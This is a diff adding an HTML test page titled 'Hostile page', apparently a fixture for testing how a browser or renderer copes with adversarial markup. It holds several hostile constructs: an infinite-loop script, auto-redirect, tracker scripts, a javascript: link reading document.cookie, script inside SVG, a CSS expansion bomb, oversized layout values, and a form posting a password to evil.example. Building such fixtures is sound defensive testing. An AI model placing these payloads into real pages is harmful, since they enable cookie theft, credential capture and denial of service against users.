@@ -1,0 +1,35 @@
+<!doctype html>
+<html><head><title>Hostile page</title>
+<meta http-equiv="refresh" content="0; url=https://elsewhere.example/">
+<script>while(true){}</script>
+<script src="https://tracker.example/t.js"></script>
+<link rel="stylesheet" href="http://insecure.example/mixed.css">
+<link rel="stylesheet" href="missing.css">
+<style>
+  @import "styled-base.css";
+  body { font-family: "Comic Sans", sans-serif; }
+  .bomb { --a: var(--b) var(--b); --b: var(--c) var(--c); --c: var(--d) var(--d); --d: x x x x; margin: var(--a); }
+  .hidden-tracker { position: absolute; left: -9999px; }
+  p:nth-child(2n+1):not(:has(a)):is(.x, .y, :where(.z)) { color: red }
+</style>
+</head>
+<body onload="steal()">
+<h1 onclick="alert(1)">A page that tries things</h1>
+<noscript><p class="noscript">This text is in &lt;noscript&gt;: hidden while scripts run.</p></noscript>
+<p>Links: <a href="javascript:alert(document.cookie)">a script link</a>,
+<a href="about:continue">a fake "continue over http" link</a>,
+<a href="about:config">about:config</a>,
+<a href="mailto:x@example.com">mail</a>,
+<a href="#bottom">jump to the bottom</a>.</p>
+<p class="hidden-tracker">You should not see this.</p>
+<iframe src="https://ads.example/frame" width="300" height="80"></iframe>
+<object data="plugin.swf" type="application/x-shockwave-flash"></object>
+<embed src="plugin.swf">
+<p class="bomb">Custom-property expansion is bounded.</p>
+<table><tr><td colspan="65534" rowspan="65534">Huge spans</td></tr></table>
+<div style="width: 99999999px; height: 1e30px; margin-left: -1e9px">Absurd sizes</div>
+<b><i><u><b><i><u>Mis<p>nested</b> formatting</i></u> is repaired.
+<svg width="100" height="20"><script>alert(1)</script><text>svg text</text></svg>
+<form action="https://evil.example/collect" method="post"><input name="pw" type="password" value="secret"><button>Send</button></form>
+<p id="bottom">The end.</p>
+</body></html>
